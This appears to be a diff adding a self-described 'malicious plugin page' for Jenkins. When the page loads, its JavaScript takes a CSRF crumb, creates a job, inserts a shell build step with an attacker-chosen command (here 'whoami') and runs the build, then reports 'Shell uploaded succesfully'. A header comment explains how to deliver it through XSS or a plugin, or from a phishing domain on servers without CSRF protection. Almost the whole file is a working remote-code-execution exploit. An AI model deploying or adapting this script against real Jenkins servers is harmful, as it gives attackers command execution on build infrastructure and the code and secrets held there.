@@ -1,0 +1,71 @@
+<!--
+getCrumb will work only under the same domain (so it must be used VIA XSS or other posible means: e.g. from /userContent, VIA plugin or from the build sources)
+So if you want to host script on some phishy domain, it will work only on jenkins without CSRF protection enabled 
+-->
+<html>
+  <body onload="sendPayload('ZN_Shell_test','lol','http://192.168.100.6:8080')">
+    <div>
+      Sample malicious plugin page
+      <p>Your crumb is:<div id="crumb"></div></p>
+      <div id="result"></div>
+      <script type="text/javascript">
+        function getCrumb(host) {
+          var xhttp = new XMLHttpRequest();
+          xhttp.open('GET', '/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,":",//crumb)', false);
+          xhttp.send();
+          return xhttp.responseText;
+          }
+
+        function createJob(name, host){
+          var crumb = getCrumb(host).substring(7);
+          document.getElementById("crumb").innerHTML = crumb;
+          var xhttp = new XMLHttpRequest();
+          var jobName = "name=" + name;
+          var jobCrumb = ".crumb=" + crumb;
+          var jobJSON = '{"name":"' + name + '", "mode":"hudson.model.FreeStyleProject", "from":"",".crumb":"' + crumb + '"}';
+          var data = jobName + "&mode=hudson.model.FreeStyleProject" + "&from=" + "&" + jobCrumb + "&json=" + jobJSON;
+          xhttp.open('POST', host + '/view/All/createItem', true);
+          xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+          xhttp.send(data);
+        }
+
+        function addBuildStep(name, payload, host){
+          var crumb = getCrumb().substring(7);
+          document.getElementById("crumb").innerHTML = crumb;
+          var xhttp = new XMLHttpRequest();
+          var buildName = "name=" + name;
+          var buildCrumb = ".crumb=" + crumb;
+          var buildDescription = "description=" + "";
+          var iDoNotKnowWhatTheseAreDoing = "_.daysToKeepStr=&_.numToKeepStr=&_.artifactDaysToKeepStr=&_.artifactNumToKeepStr=&stapler-class=hudson.tasks.LogRotator&$class=hudson.tasks.LogRotator&stapler-class-bag=true&github.projectUrl=&quiet_period=5&scmCheckoutRetryCount=0&_.customWorkspace=&_.displayNameOrNull=&scm=0&_.cvsRoot=&_.password=&_.branchName=&stapler-class=hudson.scm.CvsRepositoryLocation$BranchRepositoryLocation&$class=hudson.scm.CvsRepositoryLocation$BranchRepositoryLocation&stapler-class=hudson.scm.CvsRepositoryLocation$HeadRepositoryLocation&$class=hudson.scm.CvsRepositoryLocation$HeadRepositoryLocation&_.tagName=&stapler-class=hudson.scm.CvsRepositoryLocation$TagRepositoryLocation&$class=hudson.scm.CvsRepositoryLocation$TagRepositoryLocation&_.remoteName=&_.localName=&stapler-class=hudson.scm.browsers.FishEyeCVS&$class=hudson.scm.browsers.FishEyeCVS&stapler-class=hudson.scm.browsers.OpenGrok&$class=hudson.scm.browsers.OpenGrok&stapler-class=hudson.scm.browsers.ViewCVS&$class=hudson.scm.browsers.ViewCVS&_.pattern=&_.compressionLevel=-1&_.canUseUpdate=on&_.pruneEmptyDirectories=on&_.cvsRoot=&_.password=&_.branchName=&stapler-class=hudson.scm.CvsRepositoryLocation$BranchRepositoryLocation&$class=hudson.scm.CvsRepositoryLocation$BranchRepositoryLocation&stapler-class=hudson.scm.CvsRepositoryLocation$HeadRepositoryLocation&$class=hudson.scm.CvsRepositoryLocation$HeadRepositoryLocation&_.tagName=&stapler-class=hudson.scm.CvsRepositoryLocation$TagRepositoryLocation&$class=hudson.scm.CvsRepositoryLocation$TagRepositoryLocation&_.remoteName=&_.localName=&_.projectsetFileName=&stapler-class=hudson.scm.browsers.FishEyeCVS&$class=hudson.scm.browsers.FishEyeCVS&stapler-class=hudson.scm.browsers.OpenGrok&$class=hudson.scm.browsers.OpenGrok&stapler-class=hudson.scm.browsers.ViewCVS&$class=hudson.scm.browsers.ViewCVS&_.pattern=&_.compressionLevel=-1&_.canUseUpdate=on&_.username=&_.password=&_.pruneEmptyDirectories=on&stapler-class=hudson.scm.browsers.CvsFacadeRepositoryBrowser&$class=hudson.scm.browsers.CvsFacadeRepositoryBrowser&stapler-class=hudson.scm.browsers.FishEyeCVS&$class=hudson.scm.browsers.FishEyeCVS&stapler-class=hudson.scm.browsers.OpenGrok&$class=hudson.scm.browsers.OpenGrok&stapler-class=hudson.scm.browsers.ViewCVS&$class=hudson.scm.browsers.ViewCVS&_.url=&_.credentialsId=&_.name=&_.refspec=&_.name=*%2Fmaster&stapler-class=hudson.plugins.git.browser.AssemblaWeb&$class=hudson.plugins.git.browser.AssemblaWeb&stapler-class=hudson.plugins.git.browser.FisheyeGitRepositoryBrowser&$class=hudson.plugins.git.browser.FisheyeGitRepositoryBrowser&stapler-class=hudson.plugins.git.browser.KilnGit&$class=hudson.plugins.git.browser.KilnGit&stapler-class=hudson.plugins.git.browser.TFS2013GitRepositoryBrowser&$class=hudson.plugins.git.browser.TFS2013GitRepositoryBrowser&stapler-class=hudson.plugins.git.browser.BitbucketWeb&$class=hudson.plugins.git.browser.BitbucketWeb&stapler-class=hudson.plugins.git.browser.CGit&$class=hudson.plugins.git.browser.CGit&stapler-class=hudson.plugins.git.browser.GitBlitRepositoryBrowser&$class=hudson.plugins.git.browser.GitBlitRepositoryBrowser&stapler-class=hudson.plugins.git.browser.GithubWeb&$class=hudson.plugins.git.browser.GithubWeb&stapler-class=hudson.plugins.git.browser.Gitiles&$class=hudson.plugins.git.browser.Gitiles&stapler-class=hudson.plugins.git.browser.GitLab&$class=hudson.plugins.git.browser.GitLab&stapler-class=hudson.plugins.git.browser.GitList&$class=hudson.plugins.git.browser.GitList&stapler-class=hudson.plugins.git.browser.GitoriousWeb&$class=hudson.plugins.git.browser.GitoriousWeb&stapler-class=hudson.plugins.git.browser.GitWeb&$class=hudson.plugins.git.browser.GitWeb&stapler-class=hudson.plugins.git.browser.Phabricator&$class=hudson.plugins.git.browser.Phabricator&stapler-class=hudson.plugins.git.browser.RedmineWeb&$class=hudson.plugins.git.browser.RedmineWeb&stapler-class=hudson.plugins.git.browser.RhodeCode&$class=hudson.plugins.git.browser.RhodeCode&stapler-class=hudson.plugins.git.browser.Stash&$class=hudson.plugins.git.browser.Stash&stapler-class=hudson.plugins.git.browser.ViewGitWeb&$class=hudson.plugins.git.browser.ViewGitWeb&_.remote=&_.local=.&depthOption=infinity&stapler-class=hudson.scm.subversion.UpdateUpdater&$class=hudson.scm.subversion.UpdateUpdater&stapler-class=hudson.scm.subversion.CheckoutUpdater&$class=hudson.scm.subversion.CheckoutUpdater&stapler-class=hudson.scm.subversion.UpdateWithCleanUpdater&$class=hudson.scm.subversion.UpdateWithCleanUpdater&stapler-class=hudson.scm.subversion.UpdateWithRevertUpdater&$class=hudson.scm.subversion.UpdateWithRevertUpdater&stapler-class=hudson.scm.browsers.Assembla&$class=hudson.scm.browsers.Assembla&stapler-class=hudson.scm.browsers.CollabNetSVN&$class=hudson.scm.browsers.CollabNetSVN&stapler-class=hudson.scm.browsers.FishEyeSVN&$class=hudson.scm.browsers.FishEyeSVN&stapler-class=hudson.scm.browsers.SVNWeb&$class=hudson.scm.browsers.SVNWeb&stapler-class=hudson.scm.browsers.Sventon&$class=hudson.scm.browsers.Sventon&stapler-class=hudson.scm.browsers.Sventon2&$class=hudson.scm.browsers.Sventon2&stapler-class=hudson.scm.browsers.ViewSVN&$class=hudson.scm.browsers.ViewSVN&stapler-class=hudson.scm.browsers.WebSVN&$class=hudson.scm.browsers.WebSVN&stapler-class=hudson.plugins.websvn2.WebSVN2RepositoryBrowser&$class=hudson.plugins.websvn2.WebSVN2RepositoryBrowser&_.excludedRegions=&_.includedRegions=&_.excludedUsers=&_.excludedCommitMessages=&_.excludedRevprop=&authToken=&_.upstreamProjects=&ReverseBuildTrigger.threshold=SUCCESS&_.spec=&scmpoll_spec=";
+          var buildCommand = "command=" + payload;
+          var buildClass = "stapler-class=" + "hudson.tasks.Shell";
+          var buildWTF2 = "core:apply=" + "";
+          var buildJSON = '{"name":"' + name + '","description":"' + "" + '", "logrotate": false, "": "0", "buildDiscarder": {"daysToKeepStr": "", "numToKeepStr": "", "artifactDaysToKeepStr": "", "artifactNumToKeepStr": "", "stapler-class": "hudson.tasks.LogRotator", "$class": "hudson.tasks.LogRotator"}, "properties": {"stapler-class-bag": "true", "hudson-security-AuthorizationMatrixProperty": {}, "com-coravy-hudson-plugins-github-GithubProjectProperty": {"projectUrl": ""}, "hudson-model-ParametersDefinitionProperty": {}}, "disable": false, "concurrentBuild": false, "hasCustomQuietPeriod": false, "quiet_period": "5", "hasCustomScmCheckoutRetryCount": false, "scmCheckoutRetryCount": "0", "blockBuildWhenUpstreamBuilding": false, "blockBuildWhenDownstreamBuilding": false, "hasCustomWorkspace": false, "customWorkspace": "", "displayNameOrNull": "", "scm": {"value": "0"}, "builder":{"command":"' + payload + '", "": "' + payload + '", "stapler-class": "hudson.tasks.Shell", "$class": "hudson.tasks.Shell"},"core:apply": "",".crumb":"' + crumb + '"}'
+
+          var data = buildName + "&" + buildDescription + "&" + iDoNotKnowWhatTheseAreDoing + "&" +buildCommand + "&" + buildClass + "&" + buildWTF2 + "&" +buildCrumb + "&json=" + buildJSON;
+          xhttp.open('POST', host + '/job/' + name + '/configSubmit', true);
+          xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+          xhttp.send(data);
+        }
+
+        function rubBuild(name, host){
+          var crumb = getCrumb(host).substring(7);
+          var xhttp = new XMLHttpRequest();
+          var data = "delay=0sec";
+          xhttp.open('POST', host + '/job/' + name + '/build', true);
+          xhttp.setRequestHeader(".crumb", crumb);
+          xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+          xhttp.send(data);
+        }
+
+        function sendPayload(name, payload, host){
+          var Payload = "whoami"
+          createJob(name, host);
+          addBuildStep(name, Payload, host);
+          rubBuild(name,host);
+          document.getElementById("result").innerHTML = "Shell uploaded succesfully";
+        }
+      </script>
+    </div>
+  </body>
+</html>
